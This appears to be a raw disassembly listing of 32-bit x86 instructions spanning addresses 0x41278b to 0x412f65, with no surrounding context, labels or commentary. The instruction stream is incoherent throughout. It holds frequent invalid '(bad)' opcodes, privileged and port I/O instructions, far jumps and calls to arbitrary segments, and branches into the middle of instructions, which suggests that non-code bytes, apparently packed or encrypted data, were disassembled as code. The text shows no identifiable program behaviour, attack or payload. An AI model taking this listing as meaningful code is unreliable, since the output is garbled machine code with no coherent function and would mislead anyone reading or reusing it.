  41278b:	cs aaa 
  41278d:	xchg   esi,eax
  41278e:	xchg   BYTE PTR [edx],ah
  412790:	sbb    eax,0x396c5fe6
  412795:	das    
  412796:	mov    esp,0xc1919c9
  41279b:	push   ss
  41279c:	jno    0x412739
  41279e:	hlt    
  41279f:	xor    ah,bh
  4127a1:	clc    
  4127a2:	xchg   ebp,eax
  4127a3:	dec    ebx
  4127a4:	push   es
  4127a5:	leave  
  4127a6:	dec    edi
  4127a7:	icebp  
  4127a8:	fist   DWORD PTR [edx+0x3a961304]
  4127ae:	inc    ebp
  4127af:	inc    edx
  4127b0:	out    dx,al
  4127b1:	sub    eax,0x58de8b63
  4127b6:	sar    DWORD PTR [eax+eax*8-0x7d],0x98
  4127bb:	push   esp
  4127bd:	fs jg  0x4127e1
  4127c0:	mov    ebx,0xd0dbfc28
  4127c5:	push   ecx
  4127c6:	mov    edx,ebp
  4127c8:	ins    DWORD PTR es:[edi],dx
  4127c9:	add    al,0x81
  4127cb:	inc    esp
  4127cc:	mov    eax,0xb5560649
  4127d1:	or     al,0xbc
  4127d3:	push   cs
  4127d4:	shr    BYTE PTR [eax],0x9
  4127d7:	iret   
  4127d8:	xor    BYTE PTR [edx-0x46],bl
  4127db:	mov    cl,al
  4127dd:	push   esp
  4127de:	cmp    ch,BYTE PTR [edi+0x58]
  4127e1:	int    0xf3
  4127e3:	stos   BYTE PTR es:[edi],al
  4127e4:	adc    edi,DWORD PTR [ecx+0x64ce7586]
  4127ea:	or     BYTE PTR [esi-0x145cbb1],0xd6
  4127f1:	xor    al,0xe2
  4127f3:	pop    ss
  4127f4:	push   esi
  4127f5:	jbe    0x4127d0
  4127f7:	jnp    0x412827
  4127f9:	adc    bh,BYTE PTR [ecx-0x19]
  4127fc:	imul   edx,DWORD PTR [ebx+edx*8-0x78],0xe721387a
  412804:	scas   eax,DWORD PTR es:[edi]
  412805:	sbb    al,0x44
  412807:	push   ss
  412808:	nop
  412809:	inc    edi
  41280a:	cmp    ebp,esi
  41280c:	arpl   si,dx
  41280e:	xchg   ecx,eax
  41280f:	mov    eax,0x52f1349d
  412814:	dec    edi
  412815:	iret   
  412816:	fimul  DWORD PTR [esp+ebp*8]
  412819:	push   ebx
  41281a:	inc    ebp
  41281b:	shr    edi,0xd8
  41281e:	mov    edi,0x8a83b7b1
  412823:	cwde   
  412824:	dec    ebp
  412825:	ins    BYTE PTR es:[edi],dx
  412826:	loopne 0x412833
  412828:	daa    
  412829:	add    eax,0x94ab32c9
  41282e:	inc    edi
  41282f:	sub    eax,0x65f63dfd
  412834:	retf   
  412835:	lds    ebx,FWORD PTR [ecx+0x24]
  412838:	mul    ebp
  41283a:	jno    0x412819
  41283c:	aas    
  41283d:	addr16 rcr edi,0x78
  412841:	dec    ebp
  412842:	loope  0x41284f
  412844:	cmc    
  412845:	dec    edi
  412846:	retf   0x9464
  412849:	sub    al,BYTE PTR [eax]
  41284b:	xchg   ebp,eax
  41284c:	jbe    0x4127d0
  41284e:	jne    0x412819
  412850:	dec    ebx
  412851:	(bad)  
  412852:	fsub   st(1),st
  412854:	or     ch,bl
  412856:	loope  0x4127f7
  412858:	jmp    0x4127ff
  41285a:	shl    BYTE PTR ds:0x3644e092,cl
  412860:	idiv   BYTE PTR [ebp+ecx*4-0x56]
  412864:	retf   
  412865:	sub    esp,DWORD PTR [ebx-0x7]
  412868:	or     BYTE PTR [ebx-0x23],dl
  41286b:	cdq    
  41286c:	shl    BYTE PTR [eax-0x933522e],0x96
  412873:	push   esi
  412874:	aaa    
  412875:	jb     0x4128d7
  412877:	in     al,0x97
  412879:	xchg   DWORD PTR [esi+0x32c34398],edx
  41287f:	imul   ebp,DWORD PTR [ebx],0xf448f843
  412885:	jb     0x4128b3
  412887:	repnz push 0xffffffd1
  41288a:	dec    ebx
  41288b:	stos   BYTE PTR es:[edi],al
  41288c:	(bad)  
  41288d:	cmp    eax,DWORD PTR [ebp+0x4bcbe4ce]
  412893:	addr16 xchg esp,eax
  412895:	into   
  412896:	mov    WORD PTR [esi],?
  412898:	xchg   ebp,eax
  412899:	mul    BYTE PTR [esi-0x3aa0aa29]
  41289f:	sub    DWORD PTR [ebx+0x79],ebx
  4128a2:	jne    0x41283b
  4128a4:	and    dh,BYTE PTR [edi]
  4128a6:	fmul   QWORD PTR [ebx+0x2147f9f2]
  4128ac:	gs retf 
  4128ae:	mov    bl,0x79
  4128b0:	(bad)  
  4128b1:	jg     0x4128f5
  4128b3:	ror    DWORD PTR ds:0xbea95fb3,cl
  4128b9:	aas    
  4128ba:	stc    
  4128bb:	out    dx,eax
  4128bc:	jnp    0x4128b3
  4128be:	fiadd  DWORD PTR [esi]
  4128c0:	(bad)  
  4128c2:	fisttp QWORD PTR [ebx+0x22]
  4128c5:	ss sbb al,0x32
  4128c8:	jb     0x412871
  4128ca:	imul   edi,DWORD PTR [ebp-0x2071b8d9],0xd
  4128d1:	xchg   BYTE PTR [edx+ebp*1],ah
  4128d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4128d5:	popf   
  4128d6:	call   0x3896228c
  4128db:	jge    0x4128de
  4128dd:	cli    
  4128de:	lock sbb eax,0x1765d455
  4128e4:	pop    esi
  4128e5:	push   ebp
  4128e6:	jo     0x4128ec
  4128e8:	imul   ebp,DWORD PTR [ebx-0xb8dcb39],0xffffffee
  4128ef:	mov    ch,0xbd
  4128f1:	pop    edi
  4128f2:	fstp   TBYTE PTR [ecx+edi*8-0x2f80d02]
  4128f9:	pop    edx
  4128fa:	stc    
  4128fb:	cwde   
  4128fc:	cwde   
  4128fd:	out    dx,eax
  4128fe:	xchg   ebx,eax
  4128ff:	pop    edx
  412900:	inc    ebp
  412901:	int3   
  412902:	ret    
  412903:	xchg   DWORD PTR [esi-0x53d6fde4],edi
  412909:	dec    ebp
  41290a:	mov    ds:0x1bd1b08c,eax
  41290f:	push   0xfffffff3
  412911:	aas    
  412912:	test   eax,0xed36e51c
  412917:	ins    BYTE PTR es:[edi],dx
  412918:	jl     0x41292b
  41291a:	jmp    0x412919
  41291c:	inc    esi
  41291d:	test   BYTE PTR [edi-0x41ea04d5],ch
  412923:	ds push esi
  412925:	mov    ecx,0x34cbcc
  41292a:	mov    ecx,0x66ae86c3
  41292f:	cmc    
  412930:	mov    bh,0x44
  412932:	inc    edx
  412933:	rcl    ebp,cl
  412935:	jae    0x4129aa
  412937:	aas    
  412938:	enter  0x553,0xf1
  41293c:	rcr    DWORD PTR [ebx-0x5375466b],0x70
  412943:	inc    edx
  412944:	xor    BYTE PTR [ecx+0x3f],0x56
  412948:	jecxz  0x412963
  41294a:	outs   dx,BYTE PTR ds:[esi]
  41294b:	mov    ebx,0x1a68689b
  412950:	xchg   BYTE PTR ds:0x7abcc1cf,ah
  412956:	add    DWORD PTR [edi],0xdfa33657
  41295c:	inc    edi
  41295d:	imul   ecx,esi,0x8cb82abd
  412963:	popf   
  412964:	retf   
  412965:	lock mov dh,BYTE PTR [esi]
  412968:	out    0x5b,al
  41296a:	jns    0x41299f
  41296c:	pop    ss
  41296d:	icebp  
  41296e:	fst    QWORD PTR [ebx-0x79]
  412971:	call   0x2aa1:0x820ef1fe
  412978:	(bad)  
  41297a:	sbb    DWORD PTR [edi+0x34fc0bfd],esp
  412980:	cmp    eax,esi
  412982:	hlt    
  412983:	out    dx,eax
  412984:	mov    ds:0xbe8d88f2,eax
  412989:	fild   QWORD PTR [ebp-0x683a4a63]
  41298f:	sbb    ch,BYTE PTR [eax]
  412991:	add    DWORD PTR [esi-0x45],edx
  412994:	add    DWORD PTR [ecx+0x64657da0],0x6a
  41299b:	push   es
  41299c:	adc    eax,0xee2f1847
  4129a1:	sbb    eax,0xd1bdbe90
  4129a6:	out    0x8f,eax
  4129a8:	adc    al,BYTE PTR [edx]
  4129aa:	imul   edx,DWORD PTR [ecx-0xe],0xfffffff4
  4129ae:	aam    0x1c
  4129b0:	imul   edx,DWORD PTR [ebx-0xc],0xe7fbf4e8
  4129b7:	test   esi,ebp
  4129b9:	sbb    BYTE PTR [ebp+0x5d],bl
  4129bc:	popa   
  4129bd:	mov    DWORD PTR [edx],edx
  4129bf:	(bad)  
  4129c0:	(bad)  
  4129c1:	jb     0x4129fc
  4129c3:	add    al,dl
  4129c5:	inc    esi
  4129c6:	jmp    0x73e:0x3920fe6a
  4129cd:	adc    DWORD PTR [edx+ebp*2+0x11],0x5a
  4129d2:	push   ebp
  4129d3:	inc    edi
  4129d4:	jle    0x412a45
  4129d6:	out    dx,eax
  4129d7:	jnp    0x412995
  4129d9:	mov    al,BYTE PTR [ebx+0x55]
  4129dc:	call   0xf12d:0xe0fe075d
  4129e3:	or     DWORD PTR [esi+0x13ecce55],0x68
  4129ea:	mov    cl,BYTE PTR [edx-0x2d]
  4129ed:	daa    
  4129ee:	mov    bh,0xe8
  4129f0:	std    
  4129f1:	dec    ebx
  4129f2:	fnstenv [ebx*4-0x302879a7]
  4129f9:	cmp    ebx,edx
  4129fb:	mov    dl,BYTE PTR [ebx-0x5c]
  4129fe:	mov    bl,0xff
  412a00:	shr    DWORD PTR [ecx-0x51],0x31
  412a04:	dec    ecx
  412a05:	sub    eax,0xad45d2d3
  412a0a:	or     bl,BYTE PTR [ecx+ebx*1+0x6]
  412a0e:	adc    BYTE PTR [edi+edi*2-0x5a],0x5
  412a13:	mov    dh,ah
  412a15:	repnz dec ebp
  412a17:	xlat   BYTE PTR ds:[ebx]
  412a18:	test   ah,dh
  412a1a:	and    BYTE PTR [edx-0x7d],0xc9
  412a1e:	cld    
  412a1f:	cs xchg esi,eax
  412a21:	iret   
  412a22:	xchg   esp,eax
  412a23:	mov    ds:0xde760cc1,eax
  412a28:	inc    esp
  412a29:	idiv   BYTE PTR [ebx-0x1e97219f]
  412a2f:	(bad)  
  412a30:	out    dx,eax
  412a31:	jno    0x412a83
  412a33:	sub    cl,BYTE PTR [ebx+0x522bec4a]
  412a39:	sti    
  412a3a:	pop    edi
  412a3b:	xor    eax,0xba365bd
  412a40:	cdq    
  412a41:	inc    esi
  412a42:	xor    cl,BYTE PTR [esi-0x31c33376]
  412a48:	xor    al,0x6f
  412a4a:	lock cld 
  412a4c:	lods   eax,DWORD PTR ds:[esi]
  412a4e:	fistp  DWORD PTR [ebp+0x35d6649a]
  412a54:	xchg   ecx,eax
  412a55:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412a56:	jo     0x412a51
  412a58:	mov    ch,0x60
  412a5a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412a5b:	push   0x6cca2bd2
  412a60:	popf   
  412a61:	stos   BYTE PTR es:[edi],al
  412a62:	hlt    
  412a63:	push   edi
  412a64:	cmp    DWORD PTR [ecx],esi
  412a66:	jno    0x412a79
  412a68:	push   edi
  412a69:	add    DWORD PTR [esi-0x32],0x78
  412a6d:	ret    
  412a6e:	sub    eax,0xc064f8f4
  412a73:	fistp  QWORD PTR [edx]
  412a75:	loope  0x412abc
  412a77:	cmc    
  412a78:	rcl    BYTE PTR [edi+0x77],cl
  412a7b:	sbb    eax,0xbe5428fc
  412a80:	push   ss
  412a81:	shl    BYTE PTR [edi-0x46],cl
  412a84:	loope  0x412a58
  412a86:	imul   BYTE PTR [edx-0x34]
  412a89:	retf   
  412a8a:	(bad)  
  412a8b:	out    dx,eax
  412a8c:	lods   eax,DWORD PTR ds:[esi]
  412a8d:	out    0x27,al
  412a8f:	std    
  412a90:	ret    0xf8e4
  412a93:	dec    esi
  412a94:	out    dx,eax
  412a95:	and    eax,0xf4bda9e0
  412a9a:	clc    
  412a9b:	addr16 (bad) 
  412a9d:	js     0x412a57
  412a9f:	outs   dx,BYTE PTR ds:[esi]
  412aa0:	push   edx
  412aa1:	outs   dx,BYTE PTR ds:[esi]
  412aa2:	(bad)  
  412aa3:	in     eax,dx
  412aa4:	pop    eax
  412aa5:	lods   eax,DWORD PTR ds:[esi]
  412aa6:	or     al,0x5
  412aa8:	mov    al,ds:0xebc9c8ba
  412aad:	call   0xdc8c7fe9
  412ab2:	sbb    DWORD PTR [edx-0xd],eax
  412ab5:	js     0x412ac8
  412ab7:	xor    cl,BYTE PTR [ebx-0x71]
  412aba:	(bad)  
  412abb:	jno    0x412a46
  412abd:	loopne 0x412b2f
  412abf:	jnp    0x412af9
  412ac1:	or     eax,0x5e2f5394
  412ac6:	jmp    0x412ae4
  412ac8:	sub    dl,al
  412aca:	push   ds
  412acb:	adc    eax,DWORD PTR [edx+0x36]
  412ace:	jne    0x412b0f
  412ad0:	inc    edi
  412ad1:	fcmovne st,st(6)
  412ad3:	push   edx
  412ad4:	gs add al,0x79
  412ad7:	pop    esp
  412ad8:	pop    edx
  412ad9:	stc    
  412ada:	lea    edx,[edi-0x66]
  412add:	mov    ebx,0x74214d6f
  412ae2:	div    dl
  412ae4:	rcr    BYTE PTR ds:0xe74bbaa1,0xaf
  412aeb:	sar    DWORD PTR [ebp+0x1c4d651e],1
  412af1:	arpl   sp,ax
  412af3:	fld    QWORD PTR [eax+0x774b992a]
  412af9:	(bad)  
  412afb:	(bad)  
  412afc:	mov    edi,0x7ff9e906
  412b01:	inc    ebp
  412b02:	mov    cl,0x88
  412b04:	mov    DWORD PTR [eax-0x3954bd2c],edx
  412b0a:	mov    dh,dh
  412b0c:	inc    eax
  412b0d:	arpl   WORD PTR [eax+0x34],cx
  412b10:	sbb    ecx,DWORD PTR [ebp-0x16]
  412b13:	push   ds
  412b14:	cs mov esp,0xfd16892c
  412b1a:	rol    eax,0x6a
  412b1d:	and    al,0xa3
  412b1f:	outs   dx,BYTE PTR ds:[esi]
  412b20:	repz mov ecx,0x21ceba55
  412b26:	jo     0x412ac3
  412b28:	xchg   DWORD PTR gs:[edi-0x4b],edi
  412b2c:	out    0x8b,eax
  412b2e:	les    edx,FWORD PTR [eax-0x36]
  412b31:	adc    BYTE PTR [edi-0x6f],0x36
  412b35:	mov    WORD PTR [ebx+0x42b554f4],es
  412b3b:	mov    esi,0xf3dd3d3f
  412b40:	(bad)  
  412b41:	fptan  
  412b43:	fiadd  DWORD PTR [ecx+0x37]
  412b46:	in     eax,dx
  412b47:	xor    esp,DWORD PTR [esi]
  412b49:	outs   dx,BYTE PTR ds:[esi]
  412b4a:	jl     0x412b83
  412b4c:	test   BYTE PTR [esi],bl
  412b4e:	aaa    
  412b4f:	(bad)  
  412b50:	jg     0x412ba6
  412b52:	xor    bh,BYTE PTR [ecx+0x4641d92b]
  412b58:	fscale 
  412b5a:	shl    DWORD PTR [esi],cl
  412b5c:	dec    edx
  412b5d:	stos   BYTE PTR es:[edi],al
  412b5e:	test   al,dl
  412b60:	out    dx,eax
  412b61:	(bad)  
  412b62:	adc    al,BYTE PTR [eax]
  412b64:	and    eax,0xf3da5558
  412b69:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412b6a:	dec    eax
  412b6b:	ja     0x412af0
  412b6d:	mov    BYTE PTR [edx+0x795a4e0e],bl
  412b73:	loop   0x412bca
  412b75:	sbb    edi,0xffffffc2
  412b78:	addr16 iret 
  412b7a:	bound  ebp,QWORD PTR [edx+0x2314772d]
  412b80:	shl    DWORD PTR es:[esi],0x6d
  412b84:	ins    DWORD PTR es:[edi],dx
  412b85:	cmp    dh,bl
  412b87:	jg     0x412b41
  412b89:	(bad)  
  412b8a:	jmp    0x634f0562
  412b8f:	lea    ebx,[edi]
  412b91:	loopne 0x412bd7
  412b93:	mov    esi,0x810210a4
  412b98:	ret    0x248a
  412b9b:	mov    al,0x69
  412b9d:	lock push esi
  412b9f:	inc    DWORD PTR [edi]
  412ba1:	leave  
  412ba2:	es stc 
  412ba4:	mov    eax,es
  412ba6:	mov    esi,0x8cb86d16
  412bab:	lea    edi,[esi-0x1bfa5d02]
  412bb1:	adc    al,0xf3
  412bb3:	or     al,dl
  412bb5:	sti    
  412bb6:	lea    esi,[eax-0x348dad74]
  412bbc:	xchg   ecx,eax
  412bbd:	mov    WORD PTR [esi-0x6b7984df],ss
  412bc3:	dec    esp
  412bc4:	mov    DWORD PTR [esi+0x779eace9],edx
  412bca:	push   0x1945fe85
  412bcf:	lds    edx,FWORD PTR [ebx+0x7b]
  412bd2:	jne    0x412bbe
  412bd4:	xor    DWORD PTR [ecx],edx
  412bd6:	lods   eax,DWORD PTR ds:[esi]
  412bd7:	sahf   
  412bd8:	es or  eax,0x6a93ac13
  412bde:	push   cs
  412bdf:	lock push ecx
  412be1:	cmp    dl,dh
  412be3:	xchg   ebp,eax
  412be4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412be5:	dec    eax
  412be6:	aaa    
  412be7:	sbb    BYTE PTR [eax+0x1e676d1b],0xc1
  412bee:	cmc    
  412bef:	in     al,0x58
  412bf1:	jns    0x412c64
  412bf3:	xchg   ebp,eax
  412bf4:	or     DWORD PTR [edi+0x221888be],ebx
  412bfa:	rcr    bh,cl
  412bfc:	pop    es
  412bfd:	dec    esi
  412bfe:	pop    ecx
  412bff:	inc    esp
  412c00:	loopne 0x412c13
  412c02:	mov    ds:0x7bfc9199,al
  412c07:	int    0x63
  412c09:	and    al,0x16
  412c0b:	xor    ecx,ebp
  412c0d:	or     eax,0x7adcc977
  412c12:	(bad)  
  412c13:	fidivr DWORD PTR [esi]
  412c15:	cli    
  412c16:	and    al,0xec
  412c18:	xchg   ebp,eax
  412c19:	pop    ss
  412c1a:	ror    BYTE PTR [edi-0x3cc0e062],cl
  412c20:	aaa    
  412c21:	inc    ecx
  412c22:	std    
  412c23:	fyl2xp1 
  412c25:	jecxz  0x412bb9
  412c27:	fnstsw WORD PTR [ebx+0x170d13fb]
  412c2d:	aam    0x8c
  412c2f:	sub    DWORD PTR [edi],ebx
  412c31:	jmp    0x4c5cdaec
  412c36:	inc    eax
  412c37:	dec    ebp
  412c38:	jp     0x412c0f
  412c3a:	xor    BYTE PTR [edx+0x4d],al
  412c3d:	pop    edx
  412c3e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412c3f:	sbb    al,0x3
  412c41:	dec    ebx
  412c42:	mov    eax,0xf7a26b82
  412c47:	jmp    0x412c7d
  412c49:	jle    0x412bcf
  412c4b:	cmc    
  412c4c:	xchg   edi,eax
  412c4d:	and    BYTE PTR [ecx-0x4f1121b5],cl
  412c53:	inc    ecx
  412c54:	jmp    0xfdda8d89
  412c59:	mov    eax,0xa2a5c839
  412c5e:	rol    DWORD PTR [edi],cl
  412c60:	cdq    
  412c61:	pop    ebx
  412c62:	std    
  412c63:	out    0x27,al
  412c65:	dec    ecx
  412c66:	xor    eax,0x24c5a826
  412c6b:	adc    eax,eax
  412c6d:	mov    edx,0xca3ec410
  412c72:	mov    BYTE PTR [ebp+0x6054591f],dh
  412c78:	jge    0x412bfe
  412c7a:	iret   
  412c7b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412c7c:	sbb    al,0x87
  412c7e:	sub    edx,DWORD PTR [ecx-0x31cc4597]
  412c84:	push   esi
  412c85:	inc    ecx
  412c86:	gs clc 
  412c88:	push   0xec6953b0
  412c8d:	xchg   edi,eax
  412c8e:	in     eax,dx
  412c8f:	jno    0x412cab
  412c91:	xchg   BYTE PTR ds:0x5077797e,ch
  412c97:	or     DWORD PTR [ebp+edx*8+0xd992f85],edi
  412c9e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412c9f:	jmp    0x63dc:0xd8f372ca
  412ca6:	in     eax,0xcd
  412ca8:	mov    edi,0x85959dfc
  412cad:	loopne 0x412c79
  412caf:	out    0x4e,al
  412cb1:	daa    
  412cb2:	mov    edx,0x39b31f12
  412cb7:	jmp    0x1f61b925
  412cbc:	sbb    BYTE PTR [esi+0x33539ac1],bh
  412cc2:	lods   eax,DWORD PTR ds:[esi]
  412cc3:	shl    edi,1
  412cc5:	icebp  
  412cc6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412cc7:	lock add BYTE PTR [esi+0x11e1730],al
  412cce:	cmp    edi,0xa76ec89a
  412cd4:	push   0xad7f1a0b
  412cd9:	adc    BYTE PTR [edi+0x342bbdd7],dl
  412cdf:	das    
  412ce0:	sahf   
  412ce1:	jo     0x412cb5
  412ce3:	lods   al,BYTE PTR ds:[esi]
  412ce4:	test   eax,0x60e7e504
  412ce9:	or     ecx,DWORD PTR [eax-0x1f40c531]
  412cef:	push   ss
  412cf0:	fsubr  DWORD PTR [ecx+0xafead8]
  412cf6:	stos   BYTE PTR es:[edi],al
  412cf7:	cmp    eax,ebp
  412cf9:	inc    ebx
  412cfa:	jo     0x412cd5
  412cfc:	sar    BYTE PTR [edi+0x2c2431eb],cl
  412d02:	push   edx
  412d03:	lods   al,BYTE PTR ds:[esi]
  412d04:	add    ecx,DWORD PTR [esi]
  412d06:	clc    
  412d07:	out    dx,al
  412d08:	fwait
  412d09:	inc    esp
  412d0a:	adc    cl,BYTE PTR [ecx+0x59]
  412d0d:	sbb    BYTE PTR es:[eax+0x74],bl
  412d11:	fsub   DWORD PTR [esi+0x4b2d908f]
  412d17:	out    dx,eax
  412d18:	push   edx
  412d19:	cwde   
  412d1a:	cmc    
  412d1b:	inc    ecx
  412d1c:	push   eax
  412d1d:	gs jae 0x412cd8
  412d20:	pop    ecx
  412d21:	(bad)  
  412d23:	ja     0x412d17
  412d25:	jl     0x412cb0
  412d27:	mov    DWORD PTR [ebx+0x12],ecx
  412d2a:	cmp    BYTE PTR [edx-0x9],ch
  412d2d:	ss and eax,0xf5e74d2e
  412d33:	mov    dh,0xb6
  412d35:	dec    esi
  412d36:	sub    al,0xb0
  412d38:	pushf  
  412d39:	iret   
  412d3a:	jecxz  0x412ccd
  412d3c:	cmc    
  412d3d:	ins    DWORD PTR es:[edi],dx
  412d3e:	adc    BYTE PTR [ecx+0x10b0ed50],ah
  412d44:	jne    0x412dad
  412d46:	fwait
  412d47:	sbb    al,0x57
  412d49:	(bad)  
  412d4a:	out    0xc8,eax
  412d4c:	jecxz  0x412cd7
  412d4e:	mov    edi,0xc194128c
  412d53:	pop    esi
  412d54:	fsub   st,st(7)
  412d56:	in     al,0xfb
  412d58:	jge    0x412d5e
  412d5a:	push   ds
  412d5b:	inc    edi
  412d5c:	and    al,BYTE PTR [eax+edi*8]
  412d5f:	(bad)  
  412d61:	jno    0x412dbd
  412d63:	mov    ch,0xcc
  412d65:	sub    DWORD PTR [ecx-0x2a69ba7b],ecx
  412d6b:	pusha  
  412d6c:	into   
  412d6d:	sub    edi,DWORD PTR [edx+ecx*1-0x56e90e12]
  412d74:	pop    esi
  412d75:	push   0xffffffe5
  412d77:	bnd jge 0x412d37
  412d7a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412d7b:	add    DWORD PTR ds:0x12a612b9,esi
  412d81:	or     DWORD PTR [ebx-0x12],ebp
  412d84:	mov    al,0xb0
  412d86:	jmp    FWORD PTR [eax+0x63db5803]
  412d8c:	shr    BYTE PTR [esi],1
  412d8e:	shl    BYTE PTR [esp+eiz*2+0x8],0x7
  412d93:	sub    al,ah
  412d95:	pusha  
  412d96:	gs ret 0xed9
  412d9a:	xor    bl,BYTE PTR [ebp+0x49a731fe]
  412da0:	push   esi
  412da1:	fs cdq 
  412da3:	inc    ebx
  412da4:	xchg   ebx,eax
  412da5:	adc    ecx,DWORD PTR [eax+ebp*2+0x54948f28]
  412dac:	call   0x7e1d74b4
  412db1:	je     0x412d7d
  412db3:	(bad)  
  412db4:	pusha  
  412db5:	cli    
  412db6:	jl     0x412d8b
  412db8:	call   DWORD PTR [eax+0x5]
  412dbb:	push   edi
  412dbc:	icebp  
  412dbd:	jecxz  0x412d79
  412dbf:	fwait
  412dc0:	jae    0x412dff
  412dc2:	aad    0xd4
  412dc4:	jae    0x412d79
  412dc6:	bound  ecx,QWORD PTR ds:0x421ba481
  412dcc:	aas    
  412dcd:	xor    ecx,ebx
  412dcf:	lds    esp,FWORD PTR [edi+eax*1-0x2b22c9d2]
  412dd6:	fst    QWORD PTR [ebp+esi*2+0x46377570]
  412ddd:	jne    0x412e3c
  412ddf:	test   al,0x6e
  412de1:	out    dx,al
  412de2:	fisttp DWORD PTR [ebx+edx*4+0x54]
  412de6:	dec    ebp
  412de7:	(bad)  
  412de8:	fldenv [ebp+0x3693afa3]
  412dee:	fnsave [esp+ebp*2+0x56]
  412df2:	mov    al,0x83
  412df4:	sbb    ebx,DWORD PTR [eax+0x64]
  412df7:	aam    0xdf
  412df9:	mov    bh,BYTE PTR [ebp-0x4c30ad6c]
  412dff:	add    al,0xee
  412e01:	mov    dh,0xf2
  412e03:	sbb    eax,DWORD PTR [edi-0x3472169d]
  412e09:	mov    cl,0x8c
  412e0b:	dec    ecx
  412e0c:	sbb    edi,DWORD PTR [edi]
  412e0e:	scas   al,BYTE PTR es:[edi]
  412e0f:	cs ret 
  412e11:	mov    ecx,0xd1cb6ac7
  412e16:	inc    ecx
  412e17:	push   edi
  412e18:	jp     0x412e74
  412e1a:	inc    ebx
  412e1b:	xchg   ecx,eax
  412e1c:	xor    bl,dl
  412e1e:	fist   WORD PTR [edx+0x5b]
  412e21:	push   ebp
  412e22:	dec    edi
  412e23:	bound  eax,QWORD PTR [edx]
  412e25:	and    eax,0xbd3b4f3e
  412e2a:	shl    BYTE PTR cs:[ecx+0x73],0x74
  412e2f:	mov    gs,WORD PTR [ebp-0x4b85bdf9]
  412e35:	(bad)  
  412e37:	imul   esp,DWORD PTR [ebx+edi*2+0x16f2fd6d],0xba06c7eb
  412e42:	mov    ecx,0x5fa1b11a
  412e47:	xor    al,0xf0
  412e49:	test   ecx,esi
  412e4b:	sub    DWORD PTR [edi-0x687a291e],edx
  412e51:	int3   
  412e52:	sub    BYTE PTR [ebp+0x3f95cad5],bh
  412e58:	inc    ebp
  412e59:	add    bh,al
  412e5b:	repz or DWORD PTR [eax+0x60ac507c],ebp
  412e62:	dec    esp
  412e63:	mov    ch,BYTE PTR [edx+0x54c68257]
  412e69:	sub    DWORD PTR [esi-0x1e684bdc],ecx
  412e6f:	ss dec esp
  412e71:	mov    WORD PTR [esp+esi*8-0x47],es
  412e75:	call   0x5312:0x526f98f8
  412e7c:	test   edx,ecx
  412e7e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412e7f:	or     al,0x66
  412e81:	repnz mov dh,0xf4
  412e84:	sbb    edi,DWORD PTR [ebp+0x52]
  412e87:	sbb    BYTE PTR [ebp+0x3cb97db8],dh
  412e8d:	adc    al,0xf9
  412e8f:	push   esi
  412e90:	pop    es
  412e91:	clc    
  412e92:	xor    dl,BYTE PTR [eax+0x57]
  412e95:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  412e97:	lods   al,BYTE PTR ds:[esi]
  412e98:	ret    
  412e99:	cmp    BYTE PTR [esi+esi*2],bh
  412e9c:	and    DWORD PTR [ebx+0x25],eax
  412e9f:	and    ch,BYTE PTR [edx+0x13]
  412ea2:	pop    edx
  412ea3:	sub    al,BYTE PTR [eax-0x7d3850da]
  412ea9:	mov    bl,BYTE PTR [ebx+0x3c940b64]
  412eaf:	out    dx,al
  412eb0:	mov    bh,0xbd
  412eb2:	jge    0x412ea3
  412eb4:	ror    esi,1
  412eb6:	jbe    0x412e7d
  412eb8:	ret    0x7678
  412ebb:	ret    
  412ebc:	cdq    
  412ebd:	dec    edx
  412ebe:	add    ebp,DWORD PTR [ebx]
  412ec0:	cmp    eax,DWORD PTR [edi]
  412ec2:	in     eax,dx
  412ec3:	test   al,0x76
  412ec5:	add    DWORD PTR [eax+0x2],ebx
  412ec8:	data16 cli 
  412eca:	jmp    0x9f59:0x5b555850
  412ed1:	call   0xd1a1:0x5ad3aaa1
  412ed8:	or     dl,BYTE PTR [ebx+0x42]
  412edb:	xchg   ecx,eax
  412edc:	mov    esi,esp
  412ede:	mov    edi,?
  412ee0:	cmp    esi,DWORD PTR [edx]
  412ee2:	mov    ss,WORD PTR [ecx+0x63]
  412ee5:	hlt    
  412ee6:	jnp    0x412eea
  412ee8:	test   BYTE PTR [ecx],bl
  412eea:	xchg   ax,ax
  412eec:	ret    
  412eed:	xchg   esi,eax
  412eee:	mov    ds:0xe48b4022,eax
  412ef3:	and    al,0xaf
  412ef5:	lahf   
  412ef6:	mov    eax,0xb8406374
  412efb:	pop    esp
  412efc:	inc    ebx
  412efd:	aaa    
  412efe:	call   0x6d1751d1
  412f03:	in     eax,0x3b
  412f05:	mov    cl,0x86
  412f07:	xchg   ebx,eax
  412f08:	xor    BYTE PTR [ebp+0x4a],cl
  412f0b:	adc    eax,0xa7d72b71
  412f10:	in     eax,0xb4
  412f12:	adc    ch,dh
  412f14:	sub    bl,bh
  412f16:	sahf   
  412f17:	(bad)  
  412f18:	mov    esp,0x9e2839d3
  412f1d:	sbb    eax,0xf9205aea
  412f22:	dec    edi
  412f23:	call   0xccc1:0x4f1de423
  412f2a:	push   ecx
  412f2b:	jbe    0x412f69
  412f2d:	push   ebp
  412f2e:	cmp    DWORD PTR [edx-0x6c3ea1a5],0x21c8f9fe
  412f38:	out    0x67,al
  412f3a:	mov    eax,0x53c4fa2e
  412f3f:	fild   QWORD PTR [ebp-0xf]
  412f42:	(bad)  
  412f43:	dec    edi
  412f44:	(bad)  
  412f45:	sbb    eax,DWORD PTR [edi]
  412f47:	cmp    ecx,0x5d
  412f4a:	mov    ah,0x73
  412f4c:	enter  0x12ec,0xe2
  412f50:	leave  
  412f51:	or     BYTE PTR [edx],ah
  412f53:	ins    BYTE PTR es:[edi],dx
  412f54:	mov    ebx,0x8823e38d
  412f59:	cwde   
  412f5a:	jge    0x412f3c
  412f5c:	mov    dl,BYTE PTR [edx+0x2155c68e]
  412f62:	adc    ebp,DWORD PTR [edx-0xd]
  412f65:	mov    al,0x71
